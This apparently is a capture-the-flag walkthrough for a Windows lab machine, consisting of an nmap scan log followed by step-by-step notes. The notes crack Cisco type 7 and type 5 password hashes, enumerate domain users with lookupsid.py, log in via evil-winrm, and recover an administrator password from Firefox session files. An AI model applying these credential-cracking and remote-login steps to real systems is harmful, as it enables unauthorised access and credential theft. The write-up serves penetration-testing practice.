```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-15 19:45 IST
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
Initiating Ping Scan at 19:45
Scanning 10.10.10.149 [4 ports]
Completed Ping Scan at 19:45, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:45
Completed Parallel DNS resolution of 1 host. at 19:45, 0.15s elapsed
Initiating SYN Stealth Scan at 19:45
Scanning 10.10.10.149 [65535 ports]
Discovered open port 445/tcp on 10.10.10.149
Discovered open port 80/tcp on 10.10.10.149
Discovered open port 135/tcp on 10.10.10.149
SYN Stealth Scan Timing: About 2.21% done; ETC: 20:08 (0:22:49 remaining)
SYN Stealth Scan Timing: About 5.13% done; ETC: 20:07 (0:21:35 remaining)
SYN Stealth Scan Timing: About 9.37% done; ETC: 20:03 (0:16:08 remaining)
SYN Stealth Scan Timing: About 14.78% done; ETC: 19:59 (0:12:29 remaining)
SYN Stealth Scan Timing: About 20.15% done; ETC: 19:58 (0:10:34 remaining)
SYN Stealth Scan Timing: About 27.21% done; ETC: 19:56 (0:08:28 remaining)
SYN Stealth Scan Timing: About 35.43% done; ETC: 19:55 (0:06:41 remaining)
SYN Stealth Scan Timing: About 43.67% done; ETC: 19:54 (0:05:22 remaining)
SYN Stealth Scan Timing: About 49.06% done; ETC: 19:54 (0:04:51 remaining)
Discovered open port 49668/tcp on 10.10.10.149
SYN Stealth Scan Timing: About 54.89% done; ETC: 19:54 (0:04:15 remaining)
Discovered open port 5985/tcp on 10.10.10.149
SYN Stealth Scan Timing: About 61.79% done; ETC: 19:54 (0:03:30 remaining)
SYN Stealth Scan Timing: About 67.55% done; ETC: 19:54 (0:02:59 remaining)
SYN Stealth Scan Timing: About 73.30% done; ETC: 19:54 (0:02:27 remaining)
SYN Stealth Scan Timing: About 79.73% done; ETC: 19:54 (0:01:50 remaining)
SYN Stealth Scan Timing: About 85.41% done; ETC: 19:54 (0:01:20 remaining)
SYN Stealth Scan Timing: About 92.94% done; ETC: 19:54 (0:00:38 remaining)
Completed SYN Stealth Scan at 19:54, 539.10s elapsed (65535 total ports)
Initiating Service scan at 19:54
Scanning 5 services on 10.10.10.149
Completed Service scan at 19:55, 61.01s elapsed (5 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.149
Retrying OS detection (try #2) against 10.10.10.149
Initiating Traceroute at 19:55
Completed Traceroute at 19:55, 0.63s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 19:55
Completed Parallel DNS resolution of 2 hosts. at 19:55, 0.15s elapsed
NSE: Script scanning 10.10.10.149.
Initiating NSE at 19:55
Completed NSE at 19:56, 40.09s elapsed
Initiating NSE at 19:56
Completed NSE at 19:56, 0.79s elapsed
Nmap scan report for 10.10.10.149
Host is up (0.50s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49668/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2m30s, deviation: 0s, median: -2m30s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-08-15 19:53:05
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   310.12 ms 10.10.16.1
2   627.86 ms 10.10.10.149

NSE: Script Post-scanning.
Initiating NSE at 19:56
Completed NSE at 19:56, 0.00s elapsed
Initiating NSE at 19:56
Completed NSE at 19:56, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 658.67 seconds
           Raw packets sent: 131504 (5.790MB) | Rcvd: 500 (30.222KB)
```
```
Nmap Scan:

When you open port 80 you will get login page there you can login as guest also,
When you login through guest you will get config.txt where it contains encrypted password with privilage level.


http://www.ifm.net.nz/cookbooks/passwordcracker.html (password cracking website).


username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 (Q4)sJu\Y8qz*A3?d)
username rout3r password 7 0242114B0E143F015F5D1E161713 ($uperP@ssword)

$1$pdQG$o8nrSzsGXeaduXrjlvKc91 : (stealth1agent) Decrypt using (https://raw.githubusercontent.com/sazoukis/Cisco-password-type5-decrypt/master/Cisco_type5_decrypt.py) | or you can use hashcat -m 500 hash /usr/share/wordlists/rockyou.txt --force (command to bruteforce).


Now the question is to find username.

https://gist.github.com/ankitsaini2609/21db05c7c64aa7eadb34a01756f17d56 (use this script to find username)

you will find it is hazard.

Now use 
lookupsid.py hazard:stealth1agent@10.10.10.149 (to enumerate sids)

[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)

--------------------------------------------------------(User)
Administrator
support
Chase
Jason
Hazard
--------------------------------------------------------(Password)
Q4)sJu\Y8qz*A3?d Chase (Password)
$uperP@ssword
stealth1agent


evil-winrm -i 10.10.10.149 -u Chase -s '/opt/windows_Enumeration/' -e '/opt/windows_Enumeration/' (you will login as Chase)(Pasword:Q4)sJu\Y8qz*A3?d)

Go to Desktop  you will get user flag.

When you look into processes you will see firefox which is unusual so when you dig little bit about firefox you will get know aabout where it stores the sessions, when you open that file you will get the password. :) 
C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default\sessionstore-backups> cat previous.jsonlz4

admin@support.htb
4dD!5}x/re8]FBuZ ==> fortunately it is administrator password also.


evil-winrm -i 10.10.10.149 -u Administrator -s '/opt/windows_Enumeration/' -e '/opt/windows_Enumeration/'
(Password: 4dD!5}x/re8]FBuZ)

You will get the root.txt
```
